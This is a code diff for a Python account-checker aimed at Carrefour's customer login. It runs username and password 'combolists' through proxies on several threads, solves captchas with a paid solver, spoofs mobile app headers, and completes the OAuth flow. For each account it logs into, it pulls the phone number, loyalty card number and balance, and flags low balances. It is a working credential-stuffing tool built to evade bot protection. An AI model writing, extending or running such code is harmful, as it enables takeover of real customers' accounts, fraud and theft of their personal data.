+            "Accept-Language": "en-US,en;q=0.8",
+        },
+        post_proxy,
+        post_url_header="posturl",
+    )
+    log("Étape 3 réponse", f"HTTP {st3}")
+
+    goto_params = {
+        "client_id": "carrefour_onecarrefour_ios",
+        "code_challenge": code_challenge,
+        "code_challenge_method": "S256",
+        "redirect_uri": REDIRECT_URI_APP,
+        "response_type": "code",
+        "scope": "openid iam",
+    }
+    goto_path = (
+        "http://moncompte.carrefour.fr/iam/oauth2/CarrefourConnect/authorize?"
+        + urllib.parse.urlencode(goto_params).replace("+", "%20")
+    )
+    goto_full = urllib.parse.quote(goto_path, safe="")
+    auth_url = (
+        "https://moncompte.carrefour.fr/iam/json/authenticate?"
+        f"goto={goto_full}&realm=/CarrefourConnect"
+    )
+
+    auth_headers = {
+        "X-Requested-With": "XMLHttpRequest",
+        "Cache-Control": "no-cache",
+        "User-Agent": (
+            "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6_2 like Mac OS X) "
+            "AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
+        ),
+        "Referer": "https://moncompte.carrefour.fr/iam/XUI/",
+        "X-NoSession": "true",
+        "X-Username": "anonymous",
+        "Origin": "https://moncompte.carrefour.fr/",
+        "Sec-Fetch-Dest": "empty",
+        "Sec-Fetch-Site": "same-origin",
+        "Connection": "keep-alive",
+        "X-Password": "anonymous",
+        "Accept-Language": "fr-FR",
+        "Accept": "application/json, text/javascript, */*; q=0.01",
+        "Content-Type": "application/json",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Accept-API-Version": "protocol=1.0,resource=2.0",
+        "Sec-Fetch-Mode": "cors",
+    }
+    log("Étape 4", "forwarder POST → json/authenticate (anonymous, body vide)")
+    st4, _, auth_body = forwarder_post(auth_url, auth_headers, post_proxy, body=b"")
+    log("Étape 4 réponse", f"HTTP {st4} corps_len={len(auth_body)}")
+
+    source = auth_body.decode("utf-8", errors="replace")
+    auth_id = parse_lr(source, 'authId":"', '"') or parse_json_token(source, "authId")
+    if not auth_id:
+        raise RuntimeError("Could not parse authId from first authenticate response.")
+    log("Parse", f"authId={_short(str(auth_id), 80)}")
+
+    log("Solver", "createTask (Turnstile) — sans proxy urllib")
+    task = solver_create_task(solver_client_key)
+    task_dump = json.dumps(task, separators=(",", ":"))
+    if task.get("errorId") != 0 and '{"errorId":0,' not in task_dump:
+        raise RuntimeError(f"Solver createTask error: {task}")
+
+    task_id = task.get("taskId")
+    if not task_id:
+        raise RuntimeError("Missing taskId from solver")
+    log("Solver", f"taskId={task_id}")
+
+    def _on_poll(attempt: int, result: dict[str, Any]) -> None:
+        st = result.get("status", "?")
+        proc = "oui" if _response_is_solver_processing(result) else "non"
+        log(
+            "Solver getTaskResult",
+            f"tentative #{attempt} status={st!s} encore_processing={proc}",
+        )
+
+    token44 = poll_solver_until_turnstile_token(
+        solver_client_key,
+        str(task_id),
+        on_poll=_on_poll,
+    )
+    log("Solver", f"jeton captcha reçu (len={len(token44)})")
+    login_body = build_login_json_body(str(auth_id), user, password, str(token44))
+    login_headers = {
+        "Host": "moncompte.carrefour.fr",
+        "X-Requested-With": "XMLHttpRequest",
+        "Cache-Control": "no-cache",
+        "User-Agent": (
+            "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6_2 like Mac OS X) "
+            "AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
+        ),
+        "Referer": "https://moncompte.carrefour.fr/iam/XUI/",
+        "X-NoSession": "true",
+        "X-Username": "anonymous",
+        "Origin": "https://moncompte.carrefour.fr",
+        "Sec-Fetch-Dest": "empty",
+        "Sec-Fetch-Site": "same-origin",
+        "Connection": "keep-alive",
+        "X-Password": "anonymous",
+        "Accept-Language": "fr-FR",
+        "Accept": "application/json, text/javascript, */*; q=0.01",
+        "Content-Type": "application/json",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Accept-API-Version": "protocol=1.0,resource=2.0",
+        "Sec-Fetch-Mode": "cors",
+    }
+    log("Étape 5", "forwarder POST → authenticate (login + captcha)")
+    st5, _, login_resp = forwarder_post(
+        AUTHENTICATE_POST_URL,
+        login_headers,
+        post_proxy,
+        body=login_body,
+        post_url_header="posturl",
+    )
+    login_text = login_resp.decode("utf-8", errors="replace")
+    log("Étape 5 réponse", f"HTTP {st5} outcome_snippet={_short(login_text, 200)}")
+    auth_class = classify_authenticate_response(login_text)
+    log("Keycheck auth", f"classification={auth_class}")
+    if auth_class != "success":
+        return {
+            "authenticate_outcome": auth_class,
+            "authenticate_body_preview": login_text[:2000],
+            "code_challenge": code_challenge,
+        }
+
+    nonce = secrets.token_urlsafe(16).rstrip("=")[:22]
+    state = secrets.token_urlsafe(16).rstrip("=")[:22]
+    android_authorize = (
+        "https://moncompte.carrefour.fr/iam/oauth2/CarrefourConnect/authorize?"
+        + urllib.parse.urlencode(
+            {
+                "client_id": ANDROID_CLIENT_ID,
+                "code_challenge": code_challenge,
+                "code_challenge_method": "S256",
+                "nonce": nonce,
+                "prompt": "",
+                "redirect_uri": REDIRECT_URI_APP,
+                "response_type": "code",
+                "scope": "openid iam",
+                "state": state,
+            }
+        )
+    )
+
+    chrome_android_headers = {
+        "Accept": (
+            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,"
+            "image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
+        ),
+        "Accept-Encoding": "gzip, deflate, br, zstd",
+        "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
+        "Connection": "keep-alive",
+        "Host": "moncompte.carrefour.fr",
+        'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
+        "sec-ch-ua-mobile": "?0",
+        'sec-ch-ua-platform': '"Android"',
+        "Sec-Fetch-Dest": "document",
+        "Sec-Fetch-Mode": "navigate",
+        "Sec-Fetch-Site": "cross-site",
+        "Sec-Fetch-User": "?1",
+        "Upgrade-Insecure-Requests": "1",
+        "User-Agent": (
+            "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
+            "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
+        ),
+    }
+    log("Étape 6 USEPROXY TRUE", "GET authorize Android (HTTPS direct)")
+    st6, loc_h, _ = _http_request(
+        direct_opener,
+        android_authorize,
+        method="GET",
+        headers=chrome_android_headers,
+    )
+    loc_final = header_location(loc_h) or ""
+    log("Étape 6 réponse", f"HTTP {st6} Location={_short(loc_final)}")
+    code = parse_lr(loc_final, "?code=", "&")
+    if not code:
+        code = parse_lr(loc_final, "code=", "&")
+    if not code:
+        raise RuntimeError(
+            f"Could not parse authorization code from Location: {loc_final[:500]!r}"
+        )
+    log("Parse OAuth", f"code={_short(code, 40)}")
+
+    log("Étape 7 USEPROXY TRUE", "POST access_token (authorization_code)")
+    token_form = urllib.parse.urlencode(
+        {
+            "code": code,
+            "redirect_uri": REDIRECT_URI_APP,
+            "grant_type": "authorization_code",
+            "code_verifier": code_verifier,
+        }
+    ).encode("utf-8")
+
+    token_headers = {
+        "Accept-Encoding": "gzip",
+        "authorization": f"Basic {OAUTH_AUTHORIZATION_BASIC}",
+        "Connection": "Keep-Alive",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Host": "moncompte.carrefour.fr",
+        "user-agent": (
+            "Carrefour/22.6.0 Dalvik/2.1.0 (Linux; U; Android 9; SM-S9280 "
+            "Build/PQ3B.190801.11070909)"
+        ),
+        "X-Correlation-Id": str(uuid.uuid4()).upper(),
+        "X-Request-Id": secrets.token_hex(32).upper(),
+        "x-session-id": str(uuid.uuid4()),
+    }
+    token_url = (
+        "https://moncompte.carrefour.fr/iam/oauth2/CarrefourConnect/access_token"
+        "?q=loginbycode"
+    )
+    st7, _, token_raw = _http_request(
+        direct_opener,
+        token_url,
+        method="POST",
+        headers=token_headers,
+        data=token_form,
+    )
+    token_json_text = token_raw.decode("utf-8", errors="replace")
+    log("Étape 7 réponse", f"HTTP {st7} corps_len={len(token_raw)}")
+    id_token = parse_json_token(token_json_text, "id_token")
+    access_token = parse_json_token(token_json_text, "access_token")
+    log("Tokens", f"id_token présent={bool(id_token)} access_token présent={bool(access_token)}")
+
+    x_session_id, x_request_id, x_correlation_id = generate_carrefour_request_ids()
+    log("IDs Carrefour", f"x_session_id={x_session_id} x_request_id={_short(x_request_id, 48)}")
+    api_ua = token_headers["user-agent"]
+    me_headers = {
+        "Accept": "application/json",
+        "Accept-Encoding": "gzip",
+        "access-token": str(access_token),
+        "authorization": f"Bearer {id_token}",
+        "Connection": "Keep-Alive",
+        "Content-Type": "application/json",
+        "Host": "app.apimx.carrefour.fr",
+        "User-Agent": api_ua,
+        "x-carrefour-client-id": CARREFOUR_API_CLIENT_ID,
+        "x-carrefour-client-secret": CARREFOUR_API_CLIENT_SECRET,
+        "x-correlation-id": x_correlation_id,
+        "x-request-id": x_request_id,
+        "X-Session-Id": x_session_id,
+    }
+    me_url = (
+        "https://app.apimx.carrefour.fr/retail/v1/customers-management/customers/me"
+        "?full=false&fetch_kpis=true"
+    )
+    log("Étape 8 USEPROXY TRUE", "GET apimx /customers/me")
+    st8, _, me_body = _http_request(direct_opener, me_url, method="GET", headers=me_headers)
+    me_text = me_body.decode("utf-8", errors="replace")
+    log("Étape 8 réponse", f"HTTP {st8} corps_len={len(me_body)}")
+    phone = parse_regex_one(me_text, r'"phones":\[\{"num":"(\d+)"')
+    carte = parse_regex_one(me_text, r'"cards":\[\{"num":"(\d+)"')
+    linked_raw = parse_lr(me_text, '"linked":', "}")
+    linked_flag = (linked_raw or "").strip()
+    log("Parse profil", f"phone={phone or '-'} carte={carte or '-'} linked={linked_flag!s}")
+
+    _, x_request_id2, x_correlation_id2 = generate_carrefour_request_ids(x_session_id)
+    balance_headers = {
+        **me_headers,
+        "x-request-id": x_request_id2,
+        "x-correlation-id": x_correlation_id2,
+        "loyalty-card-id": str(carte or ""),
+    }
+    bal_url = (
+        "https://app.apimx.carrefour.fr/retail/v1/customers-management/"
+        "customers/me/loyalty_card/balance"
+    )
+    log("Étape 9 USEPROXY TRUE", "GET apimx loyalty_card/balance")
+    st9, _, bal_body = _http_request(
+        direct_opener, bal_url, method="GET", headers=balance_headers
+    )
+    bal_text = bal_body.decode("utf-8", errors="replace")
+    log("Étape 9 réponse", f"HTTP {st9} corps_len={len(bal_body)}")
+    rate_limited = "The number of attempts is reached" in bal_text
+    solde: float | None = None
+    try:
+        bal_obj = json.loads(bal_text)
+        if isinstance(bal_obj, dict) and "balance" in bal_obj:
+            solde = float(bal_obj["balance"])
+    except (json.JSONDecodeError, TypeError, ValueError):
+        parsed = parse_lr(bal_text, '{"balance":', "}}")
+        if parsed is not None:
+            try:
+                solde = float(parsed.strip().rstrip("}").split(",")[0])
+            except ValueError:
+                solde = None
+
+    low_balance = solde is not None and solde < 10
+    log("Fin flux", f"solde={solde!s} low_balance={low_balance} rate_limited={rate_limited}")
+
+    return {
+        "authenticate_outcome": auth_class,
+        "code_challenge": code_challenge,
+        "authorization_code": code,
+        "id_token": id_token,
+        "access_token": access_token,
+        "x_session_id": x_session_id,
+        "x_request_id": x_request_id,
+        "x_correlation_id": x_correlation_id,
+        "phone": phone,
+        "carte": carte,
+        "linked": linked_flag,
+        "linked_empty_or_zero": linked_flag in ("", "0"),
+        "balance_raw_preview": bal_text[:500],
+        "rate_limited": rate_limited,
+        "solde": solde,
+        "low_balance_under_10": low_balance,
+        "login_user": user,
+    }
+
+
+if __name__ == "__main__":
+    env_user = os.environ.get("CARREFOUR_USER", "").strip()
+    env_pass = os.environ.get("CARREFOUR_PASS", "").strip()
+    env_proxy = os.environ.get("POST_PROXY_URL", "").strip()
+    thread_env = os.environ.get("THREAD_COUNT", "").strip()
+    try:
+        env_threads = max(1, int(thread_env)) if thread_env else 1
+    except ValueError:
+        env_threads = 1
+
+    if env_user and env_pass and env_proxy:
+        solver = _solver_key_interactive()
+        direct_arg = _resolve_env_direct_https_proxy()
+        out = run_full_flow(
+            env_proxy,
+            env_user,
+            env_pass,
+            solver_client_key=solver,
+            direct_https_proxy=direct_arg,
+            job_prefix="[mode env]",
+            verbose_steps=True,
+        )
+        print(json.dumps(out, indent=2, ensure_ascii=False))
+        if env_threads > 1:
+            print(
+                f"(Note: THREAD_COUNT={env_threads} n’affecte que le mode combolist.)",
+                file=sys.stderr,
+            )
+    elif env_user and env_pass and not env_proxy:
+        print(
+            "CARREFOUR_USER et CARREFOUR_PASS sont définis mais POST_PROXY_URL est vide ; "
+            "lancez sans ces variables pour le mode interactif (proxy + combolist)."
+        )
+        raise SystemExit(1)
+    else:
+        num_threads = _prompt_thread_count()
+        solver = _solver_key_interactive()
+        routing, combos = _interactive_proxy_routing_and_combolist()
+        _run_combo_pool(routing, combos, solver, num_threads)
